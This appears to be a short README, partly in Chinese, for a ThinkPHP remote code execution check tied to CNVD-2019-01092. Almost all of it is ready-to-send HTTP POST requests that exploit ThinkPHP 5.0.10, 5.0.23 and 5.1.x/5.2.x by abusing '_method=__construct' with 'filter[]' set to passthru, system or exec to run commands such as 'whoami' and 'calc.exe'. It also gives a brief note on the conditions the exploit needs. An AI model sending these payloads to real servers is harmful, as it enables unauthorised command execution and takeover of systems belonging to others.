# thinkphp_rce_check

CNVD-2019-01092

## thinkphp 5.0.10 版本 

```
POST /tp5010/public/index.php?s=index/index/index HTTP/1.1
Host: 10.67.9.24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.67.9.24/tp/public/index.php?s=index/index/index/trytr
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Connection: close
Upgrade-Insecure-Requests: 1

s=whoami&filter%5B%5D=passthru&_method=__construct&method=
```

## thinkphp 5.0.23版本

```
POST /tp5023/public/index.php?s=captcha HTTP/1.1
Host: 10.67.9.24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 80

_method=__construct&filter[]=passthru&method=get&server[REQUEST_METHOD]=whoami
或者
_method=__construct&filter[]=system&method=GET&get[]=whoami
```

## thinkphp 5.1.x/5.2.x

利用条件:生产模式/即忽略异常提示，否则会报500错误

```
POST /tp5132/public/index.php HTTP/1.1
Host: 10.67.8.117:8889
Content-Length: 58
Cache-Control: max-age=0
Origin: http://10.67.9.24
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://10.67.9.24/tp5132/public/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

c=exec&f=calc.exe&&_method=filter&
```
设置`error_reporting(0);`版本不同，位置不一样，一般在start.php或者index.php
![Snipaste_2019-01-15_17-40-44.png](https://i.loli.net/2019/01/15/5c3dbc72305e1.png)
![Snipaste_2019-01-15_17-41-27.png](https://i.loli.net/2019/01/15/5c3dbccf8756e.png)
![Snipaste_2019-01-15_17-40-44.png](https://i.loli.net/2019/01/15/5c3dbc72305e1.png)

